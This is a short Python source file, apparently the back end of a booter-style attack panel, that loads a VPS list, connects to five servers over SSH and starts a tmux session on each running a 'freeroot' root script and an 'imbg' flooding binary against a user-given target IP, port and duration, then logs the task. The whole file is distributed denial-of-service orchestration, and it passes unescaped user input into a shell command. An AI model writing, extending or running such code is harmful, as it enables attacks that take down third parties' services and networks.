import json, time
from ssh_manager import connect_and_run

def run_task(ip, port, duration, user):
    with open("config/vps.json") as f:
        vps_list = json.load(f)["vps_list"]

    available = vps_list[:5]
    responses = []

    timestamp = int(time.time())
    task_id = f"imbg_{user}_{timestamp}"
    log_file = f"logs/{task_id}.txt"

    for vps in available:
        cmd = f"tmux new-session -d -s {task_id} 'cd freeroot && ./root.sh && cd M && ./imbg {ip} {port} {duration} 25'"
        out = connect_and_run(vps, cmd)
        responses.append(f"[{vps['name']}] started.")

    with open(log_file, "w") as log:
        log.write(f"Task started by {user} on {len(available)} VPS\n")
        log.write(f"Target: {ip}:{port} | Duration: {duration}\n")
        for line in responses:
            log.write(line + "\n")

    return f"✅ Task running on {len(available)} VPS.\n🗂️ Task ID: {task_id}"
